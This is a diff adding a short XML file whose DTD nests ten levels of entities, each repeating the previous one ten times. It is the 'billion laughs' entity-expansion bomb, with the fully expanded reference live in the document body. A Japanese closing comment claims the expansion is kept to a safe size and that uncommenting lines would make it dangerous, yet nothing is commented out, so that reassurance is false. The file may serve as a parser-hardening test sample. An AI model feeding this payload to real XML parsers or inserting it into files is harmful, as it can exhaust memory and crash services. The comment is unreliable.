@@ -1,0 +1,24 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ENTITY item "item">
+<!ENTITY item1 "&item;&item;&item;&item;&item;&item;&item;&item;&item;&item;">
+<!ENTITY item2 "&item1;&item1;&item1;&item1;&item1;&item1;&item1;&item1;&item1;&item1;">
+<!ENTITY item3 "&item2;&item2;&item2;&item2;&item2;&item2;&item2;&item2;&item2;&item2;">
+<!ENTITY item4 "&item3;&item3;&item3;&item3;&item3;&item3;&item3;&item3;&item3;&item3;">
+<!ENTITY item5 "&item4;&item4;&item4;&item4;&item4;&item4;&item4;&item4;&item4;&item4;">
+<!ENTITY item6 "&item5;&item5;&item5;&item5;&item5;&item5;&item5;&item5;&item5;&item5;">
+<!ENTITY item7 "&item6;&item6;&item6;&item6;&item6;&item6;&item6;&item6;&item6;&item6;">
+<!ENTITY item8 "&item7;&item7;&item7;&item7;&item7;&item7;&item7;&item7;&item7;&item7;">
+<!ENTITY item9 "&item8;&item8;&item8;&item8;&item8;&item8;&item8;&item8;&item8;&item8;">
+<!ENTITY item10 "&item9;&item9;&item9;&item9;&item9;&item9;&item9;&item9;&item9;&item9;">
+]> 
+<items>
+  <item>&item10;</item>
+</items>
+
+<!-- 注意：
+どのような処理系でも無理のないループ回数に止めています。
+ソースのコメントアウトを順に外していくと、膨大な回数のループが
+回り、お使いのコンピュータの動作が不安定になります。
+
+改変、実行はご自身の責任において実施してください。 -->
